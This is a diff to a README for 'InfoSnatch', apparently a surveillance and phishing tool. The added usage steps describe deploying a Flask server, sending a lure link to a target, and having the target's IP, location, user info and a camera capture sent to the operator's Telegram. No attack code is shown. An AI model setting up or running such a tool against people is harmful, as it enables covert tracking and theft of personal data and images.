@@ -1,12 +1,12 @@
 <h1 align="center" style="color: red;"><b>InfoSnatch</b></h1>
 
 ```
-  _____       __      _____             _       _     
- |_   _|     / _|    /  ___|           | |     | |    
-   | | _ __ | |_ ___ \ `--. _ __   __ _| |_ ___| |__  
-   | || '_ \|  _/ _ \ `--. \ '_ \ / _` | __/ __| '_ \
-  _| || | | | || (_) /\__/ / | | | (_| | || (__| | | |
-  \___/_| |_|_| \___/\____/|_| |_|\__,_|\__\___|_| |_|
+██╗███╗   ██╗███████╗ ██████╗ ███████╗███╗   ██╗ █████╗ ████████╗ ██████╗██╗  ██╗
+██║████╗  ██║██╔════╝██╔═══██╗██╔════╝████╗  ██║██╔══██╗╚══██╔══╝██╔════╝██║  ██║
+██║██╔██╗ ██║█████╗  ██║   ██║███████╗██╔██╗ ██║███████║   ██║   ██║     ███████║
+██║██║╚██╗██║██╔══╝  ██║   ██║╚════██║██║╚██╗██║██╔══██║   ██║   ██║     ██╔══██║
+██║██║ ╚████║██║     ╚██████╔╝███████║██║ ╚████║██║  ██║   ██║   ╚██████╗██║  ██║
+╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝   ╚═╝    ╚═════╝╚═╝  ╚═╝                                                                           
 ```
 
 
@@ -27,10 +27,21 @@ cd InfoSnatch
 pip install -r requirements.txt
 ```
 
+## Create a .env file and add your Telegram Bot Token and Chat ID
+```bash
+TOKEN=your_telegram_bot_token
+CHAT_ID=your_telegram_chat_id
+```
+
 ## Usage
 ```bash
 python app.py
 ```
 
-## Disclaimer
-This tool is meant for educational and security research purposes only. Unauthorized use for unethical tracking or surveillance is strictly prohibited.
+📌 Usage
+- ✅ Deploy the Flask server.
+- ✅ Send the HTML link to the target.
+- ✅ When they open the page, their IP, location, user info, and camera capture will be sent to Telegram.
+
+⚠️ Disclaimer
+This project is intended for educational and ethical hacking purposes only. The author does not take responsibility for any misuse. Always get consent before collecting any data.
